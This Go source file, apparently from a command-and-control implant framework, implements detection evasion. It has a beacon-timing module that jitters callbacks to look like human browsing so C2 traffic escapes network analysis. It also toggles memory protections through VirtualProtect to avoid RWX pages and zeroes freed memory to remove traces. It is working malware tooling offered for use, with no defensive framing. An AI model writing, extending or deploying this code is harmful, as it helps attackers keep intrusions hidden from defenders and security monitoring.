//go:build windows

package evasion

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"syscall"
	"time"
	"unsafe"
)

// BeaconOptimizer provides advanced beacon timing obfuscation.
// This prevents network analysis from detecting C2 patterns.
type BeaconOptimizer struct {
	baseInterval    time.Duration
	jitterPercent   float64
	humanBehavior   bool
	burstMode       bool
}

// NewBeaconOptimizer creates a beacon optimizer with human-like behavior.
func NewBeaconOptimizer(base time.Duration, jitter float64) *BeaconOptimizer {
	return &BeaconOptimizer{
		baseInterval:  base,
		jitterPercent: jitter,
		humanBehavior: true,
		burstMode:     false,
	}
}

// NextInterval returns the next sleep interval with advanced jitter.
func (bo *BeaconOptimizer) NextInterval() time.Duration {
	if !bo.humanBehavior {
		// Simple jitter
		jitter := bo.randomJitter(time.Duration(float64(bo.baseInterval) * bo.jitterPercent))
		return bo.baseInterval + jitter
	}

	// Human-like behavior simulation
	return bo.humanLikeInterval()
}

// humanLikeInterval generates intervals that mimic human browsing patterns.
func (bo *BeaconOptimizer) humanLikeInterval() time.Duration {
	// Simulate: user checks something, then gets distracted
	patterns := []time.Duration{
		bo.baseInterval,                          // Normal check
		bo.baseInterval * 2,                      // Distracted
		bo.baseInterval / 2,                      // Quick check
		bo.baseInterval * 3,                      // Long distraction
		bo.baseInterval + bo.randomJitter(5*time.Second), // Random
	}

	// Weighted selection (more likely to pick normal or distracted)
	weights := []int{40, 25, 15, 10, 10}
	total := 0
	for _, w := range weights {
		total += w
	}

	randVal, _ := rand.Int(rand.Reader, big.NewInt(int64(total)))
	r := int(randVal.Int64())

	cumulative := 0
	for i, w := range weights {
		cumulative += w
		if r < cumulative {
			return patterns[i] + bo.randomJitter(time.Duration(float64(patterns[i])*bo.jitterPercent))
		}
	}

	return patterns[0]
}

// BurstSleep simulates a burst of activity followed by silence.
func (bo *BeaconOptimizer) BurstSleep() {
	// Burst: 3-5 quick beacons
	burstCount, _ := rand.Int(rand.Reader, big.NewInt(3))
	_ = burstCount // unused for now

	for i := 0; i < 3; i++ {
		bo.Sleep()
	}

	// Long silence: 5-15 minutes
	silence, _ := rand.Int(rand.Reader, big.NewInt(600))
	time.Sleep(5*time.Minute + time.Duration(silence.Int64())*time.Second)
}

// Sleep sleeps for the next optimized interval.
func (bo *BeaconOptimizer) Sleep() {
	interval := bo.NextInterval()
	time.Sleep(interval)
}

func (bo *BeaconOptimizer) randomJitter(max time.Duration) time.Duration {
	if max <= 0 {
		return 0
	}
	randVal, _ := rand.Int(rand.Reader, big.NewInt(max.Nanoseconds()))
	return time.Duration(randVal.Int64())
}

// MemoryProtector manages memory protection to avoid detection.
// It changes memory permissions between operations to avoid RWX pages.
type MemoryProtector struct {
	regions []memProtection
}

type memProtection struct {
	addr        uintptr
	size        uintptr
	originalProt uint32
}

// NewMemoryProtector creates a new memory protector.
func NewMemoryProtector() *MemoryProtector {
	return &MemoryProtector{}
}

// Protect marks a memory region as non-executable.
func (mp *MemoryProtector) Protect(addr uintptr, size uintptr) error {
	var oldProtect uint32
	ret, _, err := procVirtualProtect.Call(
		addr,
		size,
		PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect: %v", err)
	}

	mp.regions = append(mp.regions, memProtection{
		addr:         addr,
		size:         size,
		originalProt: oldProtect,
	})

	return nil
}

// Execute marks a memory region as executable.
func (mp *MemoryProtector) Execute(addr uintptr, size uintptr) error {
	var oldProtect uint32
	ret, _, err := procVirtualProtect.Call(
		addr,
		size,
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect: %v", err)
	}

	return nil
}

// Restore restores all memory regions to their original protection.
func (mp *MemoryProtector) Restore() error {
	for _, region := range mp.regions {
		var oldProtect uint32
		procVirtualProtect.Call(
			region.addr,
			region.size,
			uintptr(region.originalProt),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}

	mp.regions = nil
	return nil
}

// ZeroMemory zeros out a memory region to remove traces.
func ZeroMemory(addr uintptr, size int) {
	slice := unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
	for i := range slice {
		slice[i] = 0
	}
}

// SecureFree zeros memory before freeing it.
func SecureFree(addr uintptr, size int) {
	ZeroMemory(addr, size)
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualFree := kernel32.NewProc("VirtualFree")
	virtualFree.Call(addr, 0, 0x8000) // MEM_RELEASE
}

// Ensure imports are used
var _ = time.Second
